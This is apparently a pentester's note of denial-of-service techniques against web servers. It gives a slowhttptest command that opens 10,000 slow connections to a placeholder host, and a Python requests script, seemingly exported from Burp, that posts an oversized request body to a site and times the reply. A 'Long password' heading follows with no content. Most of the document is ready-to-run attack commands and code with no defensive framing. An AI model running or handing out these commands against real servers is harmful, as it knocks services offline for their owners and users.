#Slow HTTP GET/POST Vulnerability
slowhttptest -c 10000 -H -g -o slowhttp -i 1 -r 2000 -t GET -u https://example.com -x 2400 -p 3

#Big entity
```
import requests
import time

from requests.models import Response
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

session = requests.session()
f=open('a.txt','r').read()
#f=open(r'C:\Users\Maximus Decimus\Desktop\PoC\dos\a.txt').read()
#f="aaaaaa"
burp0_url = "http://www.site.com/"
burp0_cookies = {"_ga": "GA1.2.1958363218.1640679715", "APPNNPS": "0emjb3ejnh1xxsnz025rhwvt"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://www.site.com/", "Upgrade-Insecure-Requests": "1"}
burp0_data = f
start = time.time()
response = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxies, verify=False)
print(response)
print(f'Time: {time.time() - start}')

```

#Long password
